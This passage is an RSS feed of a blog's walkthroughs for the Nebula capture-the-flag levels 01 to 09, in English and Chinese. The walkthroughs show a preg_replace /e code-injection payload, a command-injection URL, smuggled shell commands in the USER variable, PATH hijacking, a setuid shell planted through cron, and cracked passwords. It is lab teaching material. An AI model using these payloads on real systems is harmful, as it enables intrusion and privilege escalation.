&lt;h3 id=&#34;solution:e4424096463f5985d9de53dfe658d56b&#34;&gt;Solution&lt;/h3&gt;

&lt;p&gt;This php snippet does the following things:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;read the content of file $argv[1]&lt;/li&gt;
&lt;li&gt;replace all the text paterns liket &amp;ldquo;[email hjc@hanjc.me]&amp;rdquo; with &amp;ldquo;hjc AT hanjc dot me&amp;rdquo;&lt;/li&gt;
&lt;li&gt;replace all the &amp;ldquo;[&amp;rdquo; with &amp;ldquo;&amp;lt;&amp;ldquo;, replace &amp;ldquo;]&amp;rdquo; with &amp;ldquo;&amp;gt;&amp;rdquo;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;At the very first glace, there seems to be no problem about this code (well, turns out to be that anyone who is familiar with php security would recognize immediatly the vulnerability). But what I knew was that if there be something wrong, it must be the php function &lt;code&gt;preg_replace&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Google this function and I found many useful thing. There is a &lt;a href=&#34;https://bugs.php.net/bug.php?id=35960&#34;&gt;bug report&lt;/a&gt; related to this function, and another &lt;a href=&#34;http://www.madirish.net/402&#34;&gt;article&lt;/a&gt; explains in detail about how to exploit this vulnerability.&lt;/p&gt;

&lt;p&gt;In general, the vulnerability exists when a &amp;ldquo;\e&amp;rdquo; is set in the PCRE expression provided to the &lt;code&gt;preg_replace&lt;/code&gt; function (as in the code above), in this case, php will do normal substitution of backreferences in the replacement string, evaluate it as PHP code, and use the result for replacing the search string, as mentioned &lt;a href=&#34;http://php.net/manual/en/reference.pcre.pattern.modifiers.php&#34;&gt;here&lt;/a&gt;. This link also provides an input string tha could exploit this function, which is&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;&amp;lt;h1&amp;gt;{${eval($_GET[php_code])}}&amp;lt;/h1&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;As my goal is to run system command with this function, I modified this attack string to be&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;[email {${system(&#39;touch /home/flag09/test&#39;)}}]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Save this string in /tmp/txt, and run the following command&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;$ /home/flag09/flag09 /tmp/txt noused
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Although the program produced some errors, the file /home/flag09/test indeed appeared! So this should be a doable way to execute any command, but it is not convenient. Notice there is an additional argument &lt;code&gt;$use_me&lt;/code&gt; to function &lt;code&gt;markup&lt;/code&gt; that is never used in the function, the name of this variable indicates its purpose, which is too obvious to ignore. So I modified /tmp/txt to&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;[email {${system($use_me)}}]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Now I could run any command with&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;$ /home/flag09/flag09 /tmp/txt &amp;quot;any command&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
</description>
    </item>
    
    <item>
      <title>Exploit Exercises - Nebula Level 08</title>
      <link>/post/2014-01-24-nebula-level08/</link>
      <pubDate>Fri, 24 Jan 2014 11:43:31 +0800</pubDate>
      
      <guid>/post/2014-01-24-nebula-level08/</guid>
      <description>

&lt;h3 id=&#34;about:5292a1ddbf8ffdedd6d2a347c8ea1260&#34;&gt;About&lt;/h3&gt;

&lt;p&gt;World readable files strike again. Check what that user was up to, and use it to log into flag08 account.&lt;/p&gt;

&lt;p&gt;To do this level, log in as the &lt;em&gt;level08&lt;/em&gt; account with the password &lt;em&gt;level08&lt;/em&gt;. Files for this level can be found in /home/flag08.&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h3 id=&#34;solution:5292a1ddbf8ffdedd6d2a347c8ea1260&#34;&gt;Solution&lt;/h3&gt;

&lt;p&gt;用*level08*登录之后回看到一个名为*capture.pcap*的文件，记录了一次抓包的结果。把这个文件scp出来之后分析，中间有一处显示：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;Password: backdoor...00Rm8.ate
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;看样子是*flag08*用户的密码，不过用过十六进制编辑器的小伙伴们都知道，&amp;rdquo;.&amp;ldquo;可能是任何空白字符，不能简单的认为密码就是“backdoor&amp;hellip;00Rm8.ate”。查看这部分的十六进制，发现“.”对应的是0x7f，查了一下&lt;a href=&#34;http://www.asciitable.com/&#34;&gt;ASCII码表&lt;/a&gt;发现0x7f是DEL，也就是删除键，所以实际的密码应该是“backd00Rm8.ate”。&lt;/p&gt;

&lt;p&gt;还挺会玩儿的，拿0替代了o……&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Exploit Exercises - Nebula Level 07</title>
      <link>/post/2014-01-13-nebula-level07/</link>
      <pubDate>Mon, 13 Jan 2014 15:49:10 +0800</pubDate>
      
      <guid>/post/2014-01-13-nebula-level07/</guid>
      <description>

&lt;h3 id=&#34;about:6e8e879d12e150811eeb68f592dacf76&#34;&gt;About&lt;/h3&gt;

&lt;p&gt;The &lt;em&gt;flag07&lt;/em&gt; user was writing their very first perl program that allowed them to ping hosts to see if they were reachable from the web server.&lt;/p&gt;

&lt;p&gt;To do this level, log in as the &lt;em&gt;level07&lt;/em&gt; account with the password &lt;em&gt;level07&lt;/em&gt;. Files for this level can be found in /home/flag07.&lt;/p&gt;

&lt;h3 id=&#34;source-code:6e8e879d12e150811eeb68f592dacf76&#34;&gt;Source Code&lt;/h3&gt;

&lt;pre&gt;&lt;code class=&#34;language-perl&#34;&gt;#!/usr/bin/perl

use CGI qw{param};

print &amp;quot;Content-type: text/html\n\n&amp;quot;;

sub ping {
  $host = $_[0];

  print(&amp;quot;&amp;lt;html&amp;gt;&amp;lt;head&amp;gt;&amp;lt;title&amp;gt;Ping results&amp;lt;/title&amp;gt;&amp;lt;/head&amp;gt;&amp;lt;body&amp;gt;&amp;lt;pre&amp;gt;&amp;quot;);

  @output = `ping -c 3 $host 2&amp;gt;&amp;amp;1`;
  foreach $line (@output) { print &amp;quot;$line&amp;quot;; } 

  print(&amp;quot;&amp;lt;/pre&amp;gt;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;&amp;quot;);
  
}

# check if Host set. if not, display normal page, etc

ping(param(&amp;quot;Host&amp;quot;));
&lt;/code&gt;&lt;/pre&gt;

&lt;!-- more --&gt;

&lt;h3 id=&#34;solution:6e8e879d12e150811eeb68f592dacf76&#34;&gt;Solution&lt;/h3&gt;

&lt;p&gt;There is a &lt;em&gt;thttpd&lt;/em&gt; server started with the configuration file &lt;em&gt;/home/flag07/thttpd.conf&lt;/em&gt;, in which there is only one page named &lt;em&gt;index.cgi&lt;/em&gt; with the above code. This perl script mainly executes a &lt;code&gt;ping&lt;/code&gt; command with the user specified argument &lt;code&gt;Host&lt;/code&gt;, and prints the output onto the webpage.&lt;/p&gt;

&lt;p&gt;First access the web page through a browser with the following url:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;http://192.168.11.118:7007/index.cgi?Host=127.0.0.1
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;And the page looks fine. As the perl script does not check the user input, so we can leaverage it to execute any commands with user &lt;em&gt;flag07&lt;/em&gt; (as the http server starts with user &lt;em&gt;flag07&amp;rsquo;s&lt;/em&gt; privileage, which is configured in &lt;em&gt;thttpd.conf&lt;/em&gt;). Similar to previous exercises, I would like to pass in the argument Host=&amp;ldquo;127.0.0.1;/bin/getflag&amp;rdquo;, so I accessed the following url directly&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;http://192.168.11.118:7007/index.cgi?Host=127.0.0.1%3B%2Fbin%2Fgetflag
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;And it hacks!&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Exploit Exercises - Nebula Level 06</title>
      <link>/post/2014-01-13-nebula-level06/</link>
      <pubDate>Mon, 13 Jan 2014 15:48:33 +0800</pubDate>
      
      <guid>/post/2014-01-13-nebula-level06/</guid>
      <description>

&lt;h3 id=&#34;about:07ae660d00a2e044202f8e8de81227df&#34;&gt;About&lt;/h3&gt;

&lt;p&gt;The &lt;em&gt;flag06&lt;/em&gt; account credentials came from a legacy unix system.&lt;/p&gt;

&lt;p&gt;To do this level, log in as the &lt;em&gt;level06&lt;/em&gt; account with the password &lt;em&gt;level06&lt;/em&gt; . Files for this level can be found in /home/flag06.&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;Check out /etc/passwd&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;flag06:ueqwOCnSGdsuM:993:993::/home/flag06:/bin/sh
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Decrypted with John the Ripper, and got the login password.&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;http://www.governmentsecurity.org/articles/crack-unix-linux-passwords.html&#34;&gt;reference&lt;/a&gt;&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Exploit Exercises - Nebula Level 05</title>
      <link>/post/2014-01-13-nebula-level05/</link>
      <pubDate>Mon, 13 Jan 2014 14:16:44 +0800</pubDate>
      
      <guid>/post/2014-01-13-nebula-level05/</guid>
      <description>

&lt;h3 id=&#34;about:179c730aaf1ab914fbede043692bc166&#34;&gt;About&lt;/h3&gt;

&lt;p&gt;Check the &lt;em&gt;flag05&lt;/em&gt; home directory. You are looking for weak directory permissions&lt;/p&gt;

&lt;p&gt;To do this level, log in as the &lt;em&gt;level05&lt;/em&gt; account with the password &lt;em&gt;level05&lt;/em&gt; . Files for this level can be found in /home/flag05.&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h3 id=&#34;solution:179c730aaf1ab914fbede043692bc166&#34;&gt;Solution&lt;/h3&gt;

&lt;p&gt;Copy the file &lt;em&gt;/home/flag05/.backup/backup-19072011.tgz&lt;/em&gt; in to home directory of &lt;em&gt;level05&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;extract it&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;level05@nebula:~$ tar -xvf backup-19072011.tgz
.ssh/
.ssh/id_rsa.pub
.ssh/id_rsa
.ssh/authorized_keys
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So this should be the id key of user &lt;em&gt;flag05&lt;/em&gt;, try to use &lt;code&gt;ssh&lt;/code&gt; to login with user &lt;em&gt;flag05&lt;/em&gt; without a password, and it successed.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;level05@nebula:~$ ssh flag05@localhost

      _   __     __          __
     / | / /__  / /_  __  __/ /___ _
    /  |/ / _ \/ __ \/ / / / / __ `/
   / /|  /  __/ /_/ / /_/ / / /_/ /
  /_/ |_/\___/_.___/\__,_/_/\__,_/

    exploit-exercises.com/nebula


For level descriptions, please see the above URL.

To log in, use the username of &amp;quot;levelXX&amp;quot; and password &amp;quot;levelXX&amp;quot;, where
XX is the level number.

Currently there are 20 levels (00 - 19).


Welcome to Ubuntu 11.10 (GNU/Linux 3.0.0-12-generic i686)

 * Documentation:  https://help.ubuntu.com/
New release &#39;12.04 LTS&#39; available.
Run &#39;do-release-upgrade&#39; to upgrade to it.

flag05@nebula:~$
&lt;/code&gt;&lt;/pre&gt;
</description>
    </item>
    
    <item>
      <title>Exploit Exercises - Nebula Level 04</title>
      <link>/post/2014-01-10-nebula-level04/</link>
      <pubDate>Fri, 10 Jan 2014 20:43:48 +0800</pubDate>
      
      <guid>/post/2014-01-10-nebula-level04/</guid>
      <description>

&lt;h3 id=&#34;about:1eb2c36cf63b2a5efae90ca35d7075be&#34;&gt;About&lt;/h3&gt;

&lt;p&gt;This level requires you to read the token file, but the code restricts the files that can be read. Find a way to bypass it :)&lt;/p&gt;

&lt;p&gt;To do this level, log in as the level04 account with the password level04 . Files for this level can be found in /home/flag04.&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h3 id=&#34;solution:1eb2c36cf63b2a5efae90ca35d7075be&#34;&gt;Solution&lt;/h3&gt;

&lt;p&gt;Source code for /home/flag04/flag04 is&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;string.h&amp;gt;
#include &amp;lt;sys/types.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;fcntl.h&amp;gt;

int main(int argc, char **argv, char **envp)
{
  char buf[1024];
  int fd, rc;

  if(argc == 1) {
    printf(&amp;quot;%s [file to read]\n&amp;quot;, argv[0]);
    exit(EXIT_FAILURE);
  }

  if(strstr(argv[1], &amp;quot;token&amp;quot;) != NULL) {
    printf(&amp;quot;You may not access &#39;%s&#39;\n&amp;quot;, argv[1]);
    exit(EXIT_FAILURE);
  }

  fd = open(argv[1], O_RDONLY);
  if(fd == -1) {
    err(EXIT_FAILURE, &amp;quot;Unable to open %s&amp;quot;, argv[1]);
  }

  rc = read(fd, buf, sizeof(buf));
  
  if(rc == -1) {
    err(EXIT_FAILURE, &amp;quot;Unable to read fd %d&amp;quot;, fd);
  }

  write(1, buf, rc);
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This one is easy, just creating a soft link in the home directory of user &lt;em&gt;level04&lt;/em&gt;, and making it readable for user &lt;em&gt;flag03&lt;/em&gt; could bypass the check of the above code, of cause the name of the sofe link could not be &lt;em&gt;token&lt;/em&gt; :-P.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;$ ln -s /home/flag04/token /home/level04/aa
$ chmod a+rx /home/level04
$ /home/flag04/flag04 /home/level04/aa
&lt;/code&gt;&lt;/pre&gt;

&lt;!-- 06508b5e-8909-4f38-b630-fdb148a848a2 --&gt;

&lt;p&gt;And it works!&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Exploit Exercises - Nebula Level 03</title>
      <link>/post/2014-01-09-nebula-level03/</link>
      <pubDate>Thu, 09 Jan 2014 17:03:25 +0800</pubDate>
      
      <guid>/post/2014-01-09-nebula-level03/</guid>
      <description>

&lt;h3 id=&#34;about:328184bcb19288aeb228328d198cf81f&#34;&gt;About&lt;/h3&gt;

&lt;p&gt;Check the home directory of flag03 and take note of the files there.&lt;/p&gt;

&lt;p&gt;There is a crontab that is called every couple of minutes.&lt;/p&gt;

&lt;p&gt;To do this level, log in as the level03 account with the password level03 . Files for this level can be found in /home/flag03.&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h3 id=&#34;solution:328184bcb19288aeb228328d198cf81f&#34;&gt;Solution&lt;/h3&gt;

&lt;p&gt;No source code is available for this level, but there is a shell script in the home directory of user flag03&lt;/p&gt;

&lt;p&gt;``` sh writable.sh
#!/bin/sh
for i in /home/flag03/writable.d/* ; do
    (ulimit -t 5; bash -x &amp;ldquo;$i&amp;rdquo;)
    rm -f &amp;ldquo;$i&amp;rdquo;
done&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;
This script would be executed periodly by cron, after I have finished this level, I logged in with the admin account and get the content of the corresponding crontab file

``` sh /var/spool/cron/crontabs/flag03
*/3 * * * * /home/flag03/writable.sh
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;For the meaning of this crontab file, please refer to the &lt;a href=&#34;https://wiki.archlinux.org/index.php/cron&#34;&gt;Cron Wiki&lt;/a&gt; of Archlinux.&lt;/p&gt;

&lt;p&gt;Back to the script located in &lt;em&gt;/home/flag03&lt;/em&gt;, this script does the following things&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;limits the use cpu time to be 5s&lt;/li&gt;
&lt;li&gt;iterately executes all the executable files in directory &lt;em&gt;/home/flag03/writable.d/&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;delete these executables after executing&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;This crontab runs in user &lt;em&gt;flag03&lt;/em&gt;, we could leverage it to do something interesting, like changing the home directory of user &lt;em&gt;flag03&lt;/em&gt; to be public readable and writable, but what we need is beyond this.&lt;/p&gt;

&lt;p&gt;It is easy to find a way to get the privilege of user &lt;em&gt;flag03&lt;/em&gt; after all we have read in the previous exercises. So I wrote the following code in C&lt;/p&gt;

&lt;p&gt;``` c flag03.c
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;string.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;stdio.h&gt;&lt;/p&gt;

&lt;p&gt;int main() {
    setresuid(996, 996, 996);
    system(&amp;ldquo;/bin/bash&amp;rdquo;);
}&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;
The uid 996 is got by reading */etc/passwd*

``` c
flag03:x:996:996::/home/flag03:/bin/sh
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;What I need now is to make user &lt;em&gt;flag03&lt;/em&gt; compile this C code into an executable that could be run by &lt;em&gt;level04&lt;/em&gt; and the set-user-ID bit is set. So I wrote the following script&lt;/p&gt;

&lt;p&gt;``` sh compile
gcc -o /home/flag03/flag03 /home/level03/flag03.c
chmod 777 /home/flag03/flag03
chmod +s /home/flag03/flag03&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;
To make the file */home/level03/flag03.c* readable by user flag03, I changed the permission of my home directory

``` bash
$ chmod a+rx /home/level03
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Now, place the compile script into &lt;em&gt;/home/flag03/writable.d&amp;rdquo;, and wait patiently for the execution of crontab. After this script is called, I got an executable in */home/flag03&lt;/em&gt; to help me get the privilege of user &lt;em&gt;flag03&lt;/em&gt; :)&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Exploit Exercises - Nebula Level02</title>
      <link>/post/2014-01-09-nebula-level02/</link>
      <pubDate>Thu, 09 Jan 2014 15:13:38 +0800</pubDate>
      
      <guid>/post/2014-01-09-nebula-level02/</guid>
      <description>

&lt;p&gt;基本过程与level01一样，先看/home/flag02/flag02的源代码：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;string.h&amp;gt;
#include &amp;lt;sys/types.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;

int main(int argc, char **argv, char **envp)
{
  char *buffer;

  gid_t gid;
  uid_t uid;

  gid = getegid();
  uid = geteuid();

  setresgid(gid, gid, gid);
  setresuid(uid, uid, uid);

  buffer = NULL;

  asprintf(&amp;amp;buffer, &amp;quot;/bin/echo %s is cool&amp;quot;, getenv(&amp;quot;USER&amp;quot;));
  printf(&amp;quot;about to call system(\&amp;quot;%s\&amp;quot;)\n&amp;quot;, buffer);
  
  system(buffer);
}
&lt;/code&gt;&lt;/pre&gt;

&lt;!-- more --&gt;

&lt;p&gt;先通过$USER构建了一个字符串，然后执行该字符串。比如正常情况下&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;buffer=&amp;quot;/bin/echo level02 is cool&amp;quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;在这里echo程序用了绝对路径，不过那个$USER明显是让我们加以利用的……在本例中echo程序是动不了的了，那怎么能执行其他的命令呢？也很简单，Linux本来就可以在一行中执行多条语句，这里选择用“;”来分割。如下修改$USER&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;USER=&amp;quot;haha; /bin/bash&amp;quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;其实这里完全可以使用/bin/getflag的，就直接过掉了，不过每次都这么玩儿没意思，试试开个console吧。修改之后执行：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;~ $ /home/flag02/flag02
about to call system(&amp;quot;/bin/echo haha; /bin/bash is cool&amp;quot;)
haha
/bin/bash: is: No such file or directory
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;擦，bash执行的时候把后边的is cool当成参数了，这也简单，再次祭出“;”把bash跟他们分开&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;USER=&amp;quot;haha; /bin/bash;&amp;quot;
level02@nebula:~$ /home/flag02/flag02
about to call system(&amp;quot;/bin/echo haha; /bin/bash; is cool&amp;quot;)
haha
flag02@nebula:~$
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;这样就开了个用户为flag02的bash出来。&lt;/p&gt;

&lt;h3 id=&#34;补充:14ade78cbc8927124133e1983f6ecbf5&#34;&gt;补充&lt;/h3&gt;

&lt;p&gt;其实Linux中分隔命令不止“;”这一种方法，总结下这些分隔符的不同如下：&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;“;”：顺序执行所有命令，后一个在前一个之行结束之后才会执行&lt;/li&gt;
&lt;li&gt;“&amp;amp;&amp;amp;”：顺序执行，前一个命令成功执行之后才会执行下一个&lt;/li&gt;
&lt;li&gt;“||”：顺序执行，知道成功执行了一个命令为止（如果第一个成功了，后边的就不会执行）&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;还有种方法也可以起到在一行中分隔多个命令的方法，是使用“&amp;amp;”符号，“&amp;amp;”的本意是在一个新的进程中执行命令，对于分割命令这个目的而言算是一种曲线救国的方法了吧……注意因为“&amp;amp;”本身并不是为分隔命令而用的，所以跟其他的有些许不一样，比如以下两条命令&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;$ la &amp;amp; ll
$ la &amp;amp; ll &amp;amp;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;第一条会在新的进程中执行la，而在本进程中执行ll，第二条则会新起两个进程分别执行la和ll。&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Exploit Exercises - Nebula Level01</title>
      <link>/post/2014-01-09-nebula-level01/</link>
      <pubDate>Thu, 09 Jan 2014 14:54:40 +0800</pubDate>
      
      <guid>/post/2014-01-09-nebula-level01/</guid>
      <description>&lt;p&gt;有了level00的铺垫，level01就非常简单直接了。感觉上Nebula系列的基本要求是用levelXX用户登录，通过放在/home/flagXX目录下的可执行程序来获得flagXX的用户权限，对于level01而言，可执行程序为/home/flag01/flag01，其源代码在网站上给出了：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;string.h&amp;gt;
#include &amp;lt;sys/types.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;

int main(int argc, char **argv, char **envp)
{
  gid_t gid;
  uid_t uid;
  gid = getegid();
  uid = geteuid();

  setresgid(gid, gid, gid);
  setresuid(uid, uid, uid);

  system(&amp;quot;/usr/bin/env echo and now what?&amp;quot;);
}
&lt;/code&gt;&lt;/pre&gt;

&lt;!-- more --&gt; 

&lt;p&gt;前边代码的作用在上一篇博客中提到了，为了使当前的effective uid为flag01，所以system这一句是以flag01这个user的权限执行的。通过/usr/bin/env程序执行了echo程序，在屏幕上打印“and now what？”，不过在执行echo这个命令的时候没有使用绝对路径，使得通过修改$PATH来执行任意程序成为了可能。在本例中，通过修改$PATH和重定向来直接以flag01用户执行/bin/getflag程序：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;~ $ export PATH=/home/level01:$PATH
~ $ ln -s /bin/getflag /home/level01/echo
~ $ /home/flag01/flag01
You have successfully executed getflag on a target account
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;这样就可以了。通过重定向其他程序为/home/level01/echo，可以用flag01用户执行任意程序。&lt;/p&gt;
</description>
    </item>
    
  </channel>
</rss>